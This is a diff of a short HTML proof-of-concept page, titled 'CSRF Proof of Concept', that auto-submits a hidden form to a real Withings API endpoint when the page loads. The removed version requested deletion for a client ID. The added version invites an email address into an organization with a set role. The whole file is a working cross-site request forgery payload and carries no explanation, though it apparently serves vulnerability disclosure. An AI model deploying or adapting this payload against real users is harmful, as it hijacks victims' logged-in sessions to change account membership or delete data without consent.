@@ -1,15 +1,22 @@
 <html>
   <body>
-    <form action="https://scalews.withings.com/cgi-bin/v2/partner" method="POST">
-      <input type="hidden" name="client_id" value="5f1145072dcfa92fcec3112baebc090ba16d9da5da709d695a08a942a06ac200">
-      <input type="hidden" name="action" value="requestdeletion">
+    <h1>CSRF Proof of Concept</h1>
+
+    <form id="csrfForm" action="https://scalews.withings.com/cgi-bin/v2/oauth2" method="POST">
+      
+      <!-- Example POST parameters -->
+      <input type="hidden" name="organization_id" value="48806">
+      <input type="hidden" name="email" value="test@example.com">
+      <input type="hidden" name="roleid" value="2">
+      <input type="hidden" name="action" value="invitememberorganization">
       <input type="hidden" name="appname" value="developerdashboard">
       <input type="hidden" name="apppfm" value="web">
       <input type="hidden" name="appliver" value="f568a92f">
+
     </form>
 
     <script>
-      document.forms[0].submit();
+      document.getElementById('csrfForm').submit();
     </script>
   </body>
 </html>
